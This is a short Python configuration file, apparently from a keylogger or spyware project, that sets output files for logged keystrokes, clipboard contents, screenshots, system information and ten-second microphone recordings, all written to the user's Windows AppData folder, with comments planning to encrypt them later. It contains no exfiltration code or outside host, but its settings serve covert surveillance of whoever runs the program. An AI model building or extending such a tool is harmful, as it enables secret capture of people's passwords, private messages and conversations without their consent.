from os import environ
system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"
#system_information_e = 'e_system.txt' #Will implement encryption later
#clipboard_information_e = 'e_clipboard.txt' #Will implement encryption later
#keys_information_e = 'e_keys_logged.txt' #Will implement encryption later
key_log_path = "%s\\appdata\\"%environ['USERPROFILE']
syscon_path = key_log_path
clipboard_path = key_log_path
audio_path = key_log_path

audio_sample_freq=44100
audio_time =  10
ss_path = key_log_path